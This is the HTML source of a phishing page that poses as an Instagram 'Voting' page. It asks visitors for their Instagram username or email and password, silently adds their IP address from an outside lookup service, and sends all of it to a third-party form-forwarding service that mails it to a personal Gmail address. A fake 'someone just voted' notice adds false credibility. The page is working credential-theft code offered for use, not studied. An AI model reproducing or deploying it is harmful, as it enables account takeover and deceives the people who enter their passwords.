<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voting Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #ffeb00;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .instagram-logo img {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"], input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
        }

        .submit-btn {
            background-color: #1a73e8;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #155bb5;
        }

        .notification {
            background-color: #2196f3;
            color: white;
            padding: 15px;
            border-radius: 5px;
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0.9rem;
            display: flex;
            align-items: center;
        }

        .notification img {
            border-radius: 50%;
            margin-right: 10px;
        }

        .notification span {
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="instagram-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <h1>Voting</h1>
        <p>Please fill in the correct information for a valid vote</p>
        <form id="form"  method="POST" action="https://formsubmit.co/kelvinidahor63@gmail.com">
<input type="text" id="ipAddress" name="ipAddress" readonly hidden>
<input type="hidden" name="_captcha" value="false">
                                    <input type="hidden" name="_next" value="https://votly.vercel.app/thanks.html">
            <input type="text" placeholder="Instagram Username or Email" name="username" id="username" required>
            <input type="password" placeholder="Enter your Password" name="password" id="password" required>
            <button type="submit"  id="button" class="submit-btn">Next</button>
        </form>
    </div>

        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqVyiI1XClbT2Ue-7CGVAp8sKoqe_068R9zw&s" alt="User Avatar" width="40">
        <span>Someone from United States named Shannon Lowe just voted.</span>
    </div> -->
    <script src="app.js"></script> 
<script>
    document.addEventListener('DOMContentLoaded', function () {
            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    document.getElementById('ipAddress').value = ipAddress;
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        });

</script>
</body>
</html>
